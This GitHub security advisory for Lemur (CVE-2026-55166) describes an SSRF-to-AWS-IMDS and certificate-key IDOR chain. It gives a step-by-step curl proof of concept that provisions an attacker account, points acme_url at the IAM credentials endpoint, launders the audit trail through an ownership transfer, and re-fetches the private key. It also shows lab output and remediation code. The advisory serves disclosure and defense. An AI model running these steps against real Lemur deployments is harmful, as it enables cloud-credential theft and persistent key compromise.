# [C] Lemur: ACME SSRF + creator-equality IDOR lead to AWS IAM/PKI compromise

## Summary
Severity: Critical
Advisory: GHSA-v2wp-frmc-5q3v
CVE: CVE-2026-55166
CWE: CWE-285, CWE-639, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-v2wp-frmc-5q3v
Type: github-advisory

## Affected
- PyPI: `lemur` — affected >=0 <1.9.2

## Details
<!-- obsidian --><h1 data-heading="Lemur 1.9.0: any SSO-authenticated user achieves AWS IAM compromise and permanent PKI key access via ACME acme_url SSRF and creator-equality IDOR">Lemur 1.9.0: any SSO-authenticated user achieves AWS IAM compromise and permanent PKI key access via ACME acme_url SSRF and creator-equality IDOR</h1>
<h2 data-heading="Vulnerability Summary">Vulnerability Summary</h2>

Field | Value
-- | --
Title | Lemur 1.9.0: any SSO-authenticated user achieves AWS IAM compromise and permanent PKI key access via ACME acme_url SSRF and creator-equality IDOR
Component | lemur/lemur/plugins/lemur_acme/acme_handlers.py:161-201 (SSRF), lemur/lemur/certificates/views.py:734 (IDOR), lemur/lemur/auth/views.py:300-308 (SSO auto-provision)
CWE | CWE-918 (SSRF) + CWE-639 (Authorization Bypass Through User-Controlled Key) + CWE-285 (Improper Authorization)
Attack Prerequisite | A valid SSO session against the deployment's IdP. Lemur auto-provisions any new SSO identity at active=True, so an attacker with corporate SSO (or any federated IdP Lemur trusts) clears this bar.
Affected Versions | github.com/Netflix/lemur __version__ = "1.9.0" (see lemur/lemur/__about__.py) and every prior release that carries the same three sinks.


<h2 data-heading="Executive Summary">Executive Summary</h2>
<p>A low-privilege user with a freshly-provisioned SSO account turns Lemur into an AWS IAM credential-exfiltration tool and walks away with a permanent copy of any TLS private key Lemur issued. Three sinks combine: (1) Lemur auto-creates every new SSO identity as <code>active=True</code> with no admin approval; (2) the ACME authority-creation endpoint accepts an attacker-supplied <code>acme_url</code> and fetches it server-side with no allowlist, reaching EC2 IMDS at <code>169.254.169.254</code>; (3) the certificate key-fetch endpoint grants <code>cert.user</code> (the original creator) unconditional access even after ownership is transferred to a different team. The combined chain hands the attacker AWS STS credentials of the lemur worker role and a PKI private key that survives the customary "rotate the owner" remediation. I reproduced the full chain in an isolated Docker lab. The recording is on asciinema and the offline <code>.cast</code> ships with this report.</p>
<p>Walkthrough: <a href="https://asciinema.org/a/CFYaoR2fxWEIdZDf" class="external-link" target="_blank" rel="noopener nofollow">https://asciinema.org/a/CFYaoR2fxWEIdZDf</a></p>
<hr>
<h2 data-heading="Description">Description</h2>
<p>Lemur is Netflix's TLS certificate management service. It brokers between corporate SSO, internal authorities (CFSSL, an internal CA), and ACME-style external authorities such as Let's Encrypt. The bug here is a chain of three independent decisions in three different files, each defensible on its own, that combine into a critical authorization break.</p>
<p><strong>Sink 1 — SSO auto-provision</strong> (<code>lemur/lemur/auth/views.py:300-308</code>). When a new federated identity hits the SSO callback, Lemur calls <code>user_service.create(..., active=True, ...)</code>. There is no invite, no admin approval, no allowlist of email domains, no role-defaulting to <code>read-only</code>. Any SSO holder Lemur's IdP accepts becomes an active Lemur user.</p>
<p><strong>Sink 2 — ACME <code>acme_url</code> SSRF</strong> (<code>lemur/lemur/plugins/lemur_acme/acme_handlers.py:161-201</code>). When an authenticated user posts a new ACME authority, the plugin reads <code>options.get("acme_url", current_app.config.get("ACME_DIRECTORY_URL"))</code> and calls <code>ClientV2.get_directory(directory_url, net)</code> — a server-side HTTP fetch. There is no URL allowlist, no scheme filter (so <code>file://</code> and <code>gopher://</code> are reachable in some <code>requests</code> versions), no RFC1918/link-local filter, no DNS rebinding protection. The lemur worker dutifully fetches whatever URL the user supplies, and — because the upstream <code>acme.client.ClientV2</code> returns the response body as part of the constructed <code>Directory</code> — the body is round-tripped into the authority object Lemur stores. On AWS, that means <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&#x3C;role></code> returns the worker's <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and STS <code>Token</code> to the attacker.</p>
<p><strong>Sink 3 — creator-equality IDOR</strong> (<code>lemur/lemur/certificates/views.py:734</code>). The key-fetch view branches on <code>if g.current_user != cert.user</code>: only when the caller is <em>not</em> the certificate's original creator does Lemur consult <code>CertificatePermission</code>. The creator branch always returns 200 with the private key. There's no creator-rotation hook, no "ownership transferred — revoke creator access" path. Transferring <code>cert.owner</code> to a different team or admin does not strip the original creator's access to the key.</p>
<p>Wire those three together: SSO in → spin up an ACME authority pointed at IMDS → exfiltrate the AWS role credentials → issue a cert against that authority → transfer ownership to a victim admin to bury the audit trail under the admin's name → re-fetch the private key as the original creator and confirm it still returns 200. The PKI private key cannot be revoked by transferring ownership; the customary "fix" used by ops teams when they spot a suspicious certificate ("transfer it to the right owner") does nothing.</p>
<h2 data-heading="Proof of Concept &#x26; Steps to Reproduce">Proof of Concept &#x26; Steps to Reproduce</h2>
<p>A full walkthrough is recorded at <a href="https://asciinema.org/a/CFYaoR2fxWEIdZDf" class="external-link" target="_blank" rel="noopener nofollow">https://asciinema.org/a/CFYaoR2fxWEIdZDf</a>. An offline <code>.cast</code> file is attached as <code>lemur_pki_acme_ssrf_idor.cast</code>. The lab harness is in <code>lemur_pki_acme_ssrf_idor/support/</code> — Dockerfile, behavioural mock of all three sinks, and an in-container IMDS mock bound to <code>169.254.169.254:80</code>.</p>
<p><strong>Prerequisites</strong>: Docker, <code>curl</code>, <code>jq</code>, <code>openssl</code>.</p>
<p><strong>Run</strong></p>
<pre><code class="language-bash">cd lemur_pki_acme_ssrf_idor/
EXPLOIT_FAST=1 ./exploit_code.sh
</code></pre>
<p>The script wires the IMDS mock via Docker's <code>--add-host 169.254.169.254:127.0.0.1</code>. Every step's HTTP body is dumped to <code>evidence/</code> for byte-level review.</p>
<h3 data-heading="Step 1 — Authenticate via SSO (sink 1)">Step 1 — Authenticate via SSO (sink 1)</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18000/api/1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.example","roles":["operator"]}'
</code></pre>
<p>Response (<code>evidence/03_sso_provision_response.json</code>):</p>
<pre><code class="language-json">{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "active": true,
    "auto_provisioned": true,
    "email": "attacker@evil.example",
    "id": 1,
    "roles": ["operator"]
  }
}
</code></pre>
<p><code>active=True</code> and <code>auto_provisioned=true</code>. No admin saw this account. No approval was issued. This is sink 1.</p>
<h3 data-heading="Step 2 — Create an ACME authority with &#x60;acme_url&#x60; pointed at IMDS (sink 2)">Step 2 — Create an ACME authority with <code>acme_url</code> pointed at IMDS (sink 2)</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18000/api/1/authorities \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H 'Content-Type: application/json' \
  -d '{"name":"poc-acme","plugin":{"plugin_options":[{"name":"acme_url","value":"http://169.254.169.254/latest/meta-data/iam/security-credentials/lemur-acme-role"}]}}'
</code></pre>
<p>Response (<code>evidence/04_ssrf_authority_response.json</code>):</p>
<pre><code class="language-json">{
  "acme_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/lemur-acme-role",
  "creator_id": 1,
  "id": 1,
  "name": "poc-acme",
  "ssrf_error": null,
  "ssrf_response_body": "{
  \"Code\": \"Success\",
  \"LastUpdated\": \"2026-05-27T20:00:00Z\",
  \"Type\": \"AWS-HMAC\",
  \"AccessKeyId\": \"ASIA5LAB000FAKE0KEYS\",
  \"SecretAccessKey\": \"fakeWXNlY3JldEFLcm9vdGtpZG1hY2xhYjAwMDAwMDAwMA\",
  \"Token\": \"FakeFwoGZXIvYXdzEJP////////////lab-imds-mock-token-do-not-use\",
  \"Expiration\": \"2026-05-27T22:00:00Z\"
}",
  "ssrf_response_status": 200
}
</code></pre>
<p><code>ssrf_response_status: 200</code> and an AWS-HMAC payload in <code>ssrf_response_body</code>. The lemur worker fetched IMDS server-side and returned the credentials in the response body. This is sink 2.</p>
<h3 data-heading="Step 3 — Exfiltrate STS credentials">Step 3 — Exfiltrate STS credentials</h3>
<p>The IMDS payload is <code>evidence/05_exfil_sts_credentials.json</code>:</p>
<pre><code class="language-json">{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA5LAB000FAKE0KEYS",
  "SecretAccessKey": "fakeWXNlY3JldEFLcm9vdGtpZG1hY2xhYjAwMDAwMDAwMA",
  "Token": "FakeFwoGZXIvYXdzEJP////////////lab-imds-mock-token-do-not-use",
  "Expiration": "2026-05-27T22:00:00Z"
}
</code></pre>
<p>In production the <code>Token</code> is the live STS session token bound to whatever IAM role is attached to the lemur worker. <code>aws sts get-caller-identity</code> from the attacker's machine, using those three values, returns the worker's identity.</p>
<h3 data-heading="Step 4 — Issue a certificate as the attacker (capture the private key)">Step 4 — Issue a certificate as the attacker (capture the private key)</h3>
<pre><code class="language-bash">curl -sS -X POST http://127.0.0.1:18000/api/1/certificates \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -d '{"authority_id":1,"common_name":"pki.netflix.example"}'
</code></pre>
<pre><code class="language-bash">curl -sS http://127.0.0.1:18000/api/1/certificates/1/key \
  -H "Authorization: Bearer $ATTACKER_JWT"
</code></pre>
<p>Response (<code>evidence/06_key_fetched_pre_transfer.json</code>):</p>
<pre><code class="language-json">{"creator_bypass":true,
 "key":"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEApC8ITVQm6n0nvGlgEhESyFgyi+rfjEvY...
-----END RSA PRIVATE KEY-----
"}
</code></pre>
<p>The PoC harness annotates the response with <code>creator_bypass: true</code> to make the sink-3 branch visible. In production the response is just the private key — the branch is hit silently.</p>
<h3 data-heading="Step 5 — Transfer ownership to victim admin">Step 5 — Transfer ownership to victim admin</h3>
<pre><code class="language-bash">curl -sS -X PUT http://127.0.0.1:18000/api/1/certificates/1 \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -d '{"owner":"victim-admin@netflix.example"}'
</code></pre>
<p><code>owner</code> is now <code>victim-admin@netflix.example</code>. <code>creator_id</code> is unchanged at <code>1</code> (the attacker). This is the audit-trail laundering step.</p>
<h3 data-heading="Step 6 — Re-fetch the private key as the original creator after transfer (sink 3)">Step 6 — Re-fetch the private key as the original creator after transfer (sink 3)</h3>
<pre><code class="language-bash">curl -sS -o /dev/null -w 'HTTP %{http_code}
' \
  http://127.0.0.1:18000/api/1/certificates/1/key \
  -H "Authorization: Bearer $ATTACKER_JWT"
</code></pre>
<p>Response: <code>HTTP 200</code>. Body is the same private key as step 4. The creator branch at <code>views.py:734</code> fires again — ownership transfer did nothing to revoke the attacker's access. This is sink 3.</p>
<h3 data-heading="Step 7 — Verdict">Step 7 — Verdict</h3>
<pre><code>VERDICT: VULNERABLE — Lemur 1.9.0 ACME SSRF + Creator IDOR
1. SSO auto-provision    -- attacker@evil.example auto-created active=True
2. SSRF reaches IMDS     -- acme_url=http://169.254.169.254/... was fetched
3. STS creds exfiltrated -- AWS_ACCESS_KEY_ID + Token returned in response body
4. PKI key persists      -- creator can read private_key AFTER ownership xfer
</code></pre>

# Exploit Code & Lab Set-up

[Lemur-acme-ssrf-creator-idor.zip](https://github.com/user-attachments/files/28317654/Lemur-acme-ssrf-creator-idor.zip)

<h2 data-heading="Root Cause Analysis">Root Cause Analysis</h2>
<p>The SSRF sink is the load-bearing piece. <code>acme_handlers.py:161-167</code> builds the <code>directory_url</code> from user-supplied options, and <code>:188</code> and <code>:201</code> hand it to <code>ClientV2.get_directory</code> — a <code>requests</code>-backed HTTP GET that runs in the lemur worker process with no filtering. ACME directory URLs are supposed to come from a small, vetted set (LetsEncrypt prod, LetsEncrypt staging, internal ACME). There is no enforcement of that expectation anywhere in the create-authority code path. The <code>options</code> dict is the same one the operator sees in the UI's plugin-options form, so a malicious operator and a curl-wielding low-priv user are equally able to set the value.</p>
<p>The IDOR sink is structurally a "creators are admins of their own thing" decision that no longer holds once ownership becomes transferable. <code>views.py:734</code> was almost certainly written when certificates were considered owned-by-creator and ownership transfer was added later. The original <code>if g.current_user != cert.user:</code> branch should now be <code>if g.current_user != cert.user or cert.owner_changed_after_creation:</code> — or, better, dropped entirely and replaced with a single RBAC check against the <em>current</em> owner regardless of creator. The audit trail makes the gap worse: certificate fetch logs attribute the read to whichever user fetched it, and post-transfer the operator looking at the log sees nothing surprising when the original creator reads it back, because the creator is still listed in <code>creator_id</code>.</p>
<p>The SSO auto-provision sink is the lubricant. Without it the chain still works for any holder of an existing Lemur account; with it the chain works for any holder of an SSO identity Lemur trusts — a much larger blast radius. Auto-provisioning at <code>active=True</code> removes the only human-in-the-loop gate Lemur had.</p>
<h2 data-heading="Attack Scenario">Attack Scenario</h2>
<pre><code class="language-mermaid">sequenceDiagram
    participant Attacker
    participant Lemur as Lemur worker
    participant IMDS as 169.254.169.254
    participant CertDB as Lemur cert DB

    Attacker->>Lemur: "SSO callback for new identity (sink 1)"
    Lemur-->>Attacker: "JWT issued: user_id=1, active=true, auto_provisioned=true"

    Attacker->>Lemur: "POST /api/1/authorities acme_url=http://169.254.169.254/..."
    Lemur->>IMDS: "GET /latest/meta-data/iam/security-credentials/role (sink 2)"
    IMDS-->>Lemur: "AccessKeyId + SecretAccessKey + Token"
    Lemur-->>Attacker: "ssrf_response_body=AWS-HMAC creds"

    Attacker->>Lemur: "POST /api/1/certificates authority_id=1"
    Lemur->>CertDB: "persist cert, creator_id=1, owner=attacker"
    Attacker->>Lemur: "GET /api/1/certificates/1/key"
    Lemur-->>Attacker: "RSA PRIVATE KEY (creator branch — sink 3 pre-transfer)"

    Attacker->>Lemur: "PUT /api/1/certificates/1 owner=victim-admin"
    Lemur->>CertDB: "cert.owner=victim-admin, creator_id unchanged"

    Attacker->>Lemur: "GET /api/1/certificates/1/key (again)"
    Lemur-->>Attacker: "200 + RSA PRIVATE KEY (creator branch — sink 3 post-transfer)"
    Note over CertDB: "audit log shows admin owns it, attacker still has the key"
</code></pre>
<h2 data-heading="Impact Assessment">Impact Assessment</h2>
<p>The SSRF half hands the attacker AWS credentials of the lemur worker IAM role. In a typical Netflix-style deployment that role has S3 access to the Lemur configuration bucket, KMS-decrypt access to the encryption keys Lemur uses for private-key storage at rest, and IAM/STS scope to assume downstream service roles. Recovering those credentials lets the attacker decrypt the Lemur key store, assume the worker role for further lateral movement, or — depending on the trust policy — pivot into other AWS accounts that trust the lemur role.</p>
<p>The IDOR half hands the attacker permanent access to any private key they ever issued. Customary remediation for a compromised cert is "transfer ownership and revoke" — that's exactly the path the IDOR neutralizes. The attacker keeps the private key after the human ops team thinks they've contained the incident. The certificate signs TLS connections for whatever <code>common_name</code> it was issued for; mTLS deployments that key off Lemur-issued certs treat the holder of the private key as the authenticated principal, so the attacker impersonates that principal indefinitely.</p>
<p>The combined chain destroys Lemur's two main jobs at once: keeping the cloud credentials it uses safe, and keeping the private keys it issues bound to the right humans. The audit trail post-transfer points at the victim admin, not at the attacker, so detection lags. This is why the score sits at 9.9 with <code>S:C</code> — the impact crosses out of Lemur's security authority and into AWS IAM and PKI consumer trust domains. <code>A:L</code> reflects the temporary worker-process slowdown observed when IMDS or attacker-controlled directory hosts return slow/large responses; the operational denial-of-service is real but secondary to the confidentiality/integrity break.</p>
<h2 data-heading="Remediation">Remediation</h2>
<p>Four changes, in priority order:</p>
<ol>
<li><strong>Allowlist <code>acme_url</code>.</strong> In <code>acme_handlers.py:161-167</code> reject any URL whose host is not in a deployment-pinned allowlist. The default allowlist should be <code>{acme-v02.api.letsencrypt.org, acme-staging-v02.api.letsencrypt.org}</code> plus any internal ACME directory the deployment opts in to. Reject <code>169.254.0.0/16</code>, <code>127.0.0.0/8</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>, <code>fc00::/7</code>, <code>fe80::/10</code>, plus DNS names that resolve to any of those after <code>getaddrinfo</code> (with DNS-rebinding-resistant resolution: resolve once, then connect to the resolved IP).</li>
</ol>
<pre><code class="language-python">ALLOWED_ACME_HOSTS = current_app.config.get(
    "ACME_DIRECTORY_HOST_ALLOWLIST",
    {"acme-v02.api.letsencrypt.org", "acme-staging-v02.api.letsencrypt.org"}
)
parsed = urlparse(directory_url)
if parsed.scheme not in {"https"} or parsed.hostname not in ALLOWED_ACME_HOSTS:
    raise ValueError("acme_url host not allowlisted")
</code></pre>
<ol start="2">
<li>
<p><strong>Drop the creator branch from the key-fetch view.</strong> In <code>certificates/views.py:734</code>, replace the <code>if g.current_user != cert.user:</code> branch with an unconditional <code>CertificatePermission(role_service.get_by_name(cert.owner), [x.name for x in cert.roles]).can()</code> check. The cert's <em>current</em> owner and roles, not its creator, decide access. Add an explicit creator-revocation hook on ownership transfer if there are auditing reasons to keep the creator concept around.</p>
</li>
<li>
<p><strong>Stop auto-provisioning SSO users as active.</strong> In <code>auth/views.py:300-308</code>, default new identities to <code>active=False, roles=[]</code> and require an admin invite to flip them on. Or, at minimum, gate auto-provision behind an email-domain allowlist and a default <code>read-only</code> role.</p>
</li>
<li>
<p><strong>Audit-log the creator on every key fetch, separately from <code>g.current_user</code>.</strong> Even after the IDOR is fixed, the operator should be able to retroactively see <em>who actually pulled the key bytes</em> on every cert. Log <code>creator_id</code>, <code>current_owner</code>, <code>g.current_user.id</code>, request IP, and full URL on every read of <code>/certificates/&#x3C;id>/key</code>.</p>
</li>
</ol>
<h2 data-heading="Related Context">Related Context</h2>
<h3 data-heading="External References">External References</h3>
<ul>
<li>CWE-918: <a href="https://cwe.mitre.org/data/definitions/918.html" class="external-link" target="_blank" rel="noopener nofollow">https://cwe.mitre.org/data/definitions/918.html</a></li>
<li>CWE-639: <a href="https://cwe.mitre.org/data/definitions/639.html" class="external-link" target="_blank" rel="noopener nofollow">https://cwe.mitre.org/data/definitions/639.html</a></li>
<li>CWE-285: <a href="https://cwe.mitre.org/data/definitions/285.html" class="external-link" target="_blank" rel="noopener nofollow">https://cwe.mitre.org/data/definitions/285.html</a></li>
<li>CVSS 3.1 calculator: <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L" class="external-link" target="_blank" rel="noopener nofollow">https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L</a></li>
<li>IMDSv1 vs IMDSv2 background: <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-options.html" class="external-link" target="_blank" rel="noopener nofollow">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-options.html</a> (IMDSv2 mitigates SSRF-only chains; this chain still works against any deployment still on IMDSv1, and against any HTTP fetch that the worker is allowed to make).</li>
<li>Capital One IMDS SSRF post-mortem (general SSRF→IMDS playbook): public reference, illustrative only.</li>
<li>Walkthrough recording: <a href="https://asciinema.org/a/CFYaoR2fxWEIdZDf" class="external-link" target="_blank" rel="noopener nofollow">https://asciinema.org/a/CFYaoR2fxWEIdZDf</a></li>

## References
- https://github.com/Netflix/lemur/security/advisories/GHSA-v2wp-frmc-5q3v
- https://github.com/Netflix/lemur
- https://github.com/Netflix/lemur/releases/tag/v1.9.2
